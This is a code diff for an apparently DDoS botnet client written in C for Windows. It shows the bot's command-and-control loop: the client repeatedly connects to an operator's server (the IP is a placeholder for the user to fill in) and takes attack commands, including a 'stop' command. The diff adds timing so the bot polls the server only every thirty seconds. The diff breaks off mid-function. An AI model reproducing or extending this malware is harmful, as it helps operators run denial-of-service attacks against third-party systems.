@@ -4,9 +4,11 @@
 #include <windows.h>
 #include <wininet.h>
 #include <string.h>
-
+#include <time.h>
 #define NUM_THREADS 5    // Define number of threads here or take as user input
 #pragma comment(lib, "ws2_32.lib")  //Load ws2_32.dll
+
+int hasConnected = 0;
 
 void changeCMD(char a[], char b[]) {
     for (int i = 0; i < strlen(a); i++) {
@@ -16,37 +18,56 @@ void changeCMD(char a[], char b[]) {
         a[i] = b[i];
     }
 }
+int returnSecond() {
+    time_t now;
+    struct tm* tm;
 
+    now = time(0);
+    if ((tm = localtime(&now)) == NULL) {
+        printf("Error extracting time stuff\n");
+        return 1;
+    }
+    /*
+    printf("%04d-%02d-%02d %02d:%02d:%02d\n",
+        tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
+        tm->tm_hour, tm->tm_min, tm->tm_sec);
+        */
+    return tm->tm_sec;
+}
 void DDoS()
 {
     int count = 0;
     char cmd[MAXBYTE] = { 0 };
     while (1) {
-        WSADATA wsaData;
-        WSAStartup(MAKEWORD(2, 2), &wsaData);
-        //Create the socket
-        SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
-        //Ask for the connect to the server
-        sockaddr_in sockAddr;
-        memset(&sockAddr, 0, sizeof(sockAddr));  //All bits are set 0
-        sockAddr.sin_family = PF_INET; //To use IPv4 address
-        sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Your server's IP Address
-        sockAddr.sin_port = htons(1234); //Your IP Port
-
-        connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
-        //Receive the command from server.
-        char s[20] = "";
-        itoa(count, s, 10);
-        char* str = s;
-        //send(sock, str, strlen(str) + sizeof(char), NULL);
         char szBuffer[MAXBYTE] = { 0 };
-        recv(sock, szBuffer, MAXBYTE, NULL);
-        //Output the command from server
-        printf("command from server : %s\n", szBuffer);
-        //Close the connect
-        closesocket(sock);
-        //Stop using the DLL.
-        WSACleanup();
+        if (returnSecond() == 30 || returnSecond() == 0 || hasConnected == 0) {
+            WSADATA wsaData;
+            WSAStartup(MAKEWORD(2, 2), &wsaData);
+            //Create the socket
+            SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+            //Ask for the connect to the server
+            sockaddr_in sockAddr;
+            memset(&sockAddr, 0, sizeof(sockAddr));  //All bits are set 0
+            sockAddr.sin_family = PF_INET; //To use IPv4 address
+            sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Your server's IP Address
+            sockAddr.sin_port = htons(1234); //Your IP Port
+
+            connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
+            //Receive the command from server.
+            char s[20] = "";
+            itoa(count, s, 10);
+            char* str = s;
+            //send(sock, str, strlen(str) + sizeof(char), NULL);
+            
+            recv(sock, szBuffer, MAXBYTE, NULL);
+            //Output the command from server
+            printf("command from server : %s\n", szBuffer);
+            //Close the connect
+            closesocket(sock);
+            //Stop using the DLL.
+            WSACleanup();
+            hasConnected = 1;
+        }
         //If the server sends the command to the client.
         if (szBuffer[0] != 0) {
             for (int i = 0; i < MAXBYTE; i++) {
@@ -55,6 +76,7 @@ void DDoS()
             changeCMD(cmd, szBuffer);
 
         }
+
         //If you want to stop DDoS.
         if (szBuffer[0] == 's' && szBuffer[1] == 't' && szBuffer[2] == 'o' && szBuffer[3] == 'p') {
             for (int i = 0; i < strlen(cmd); i++) {
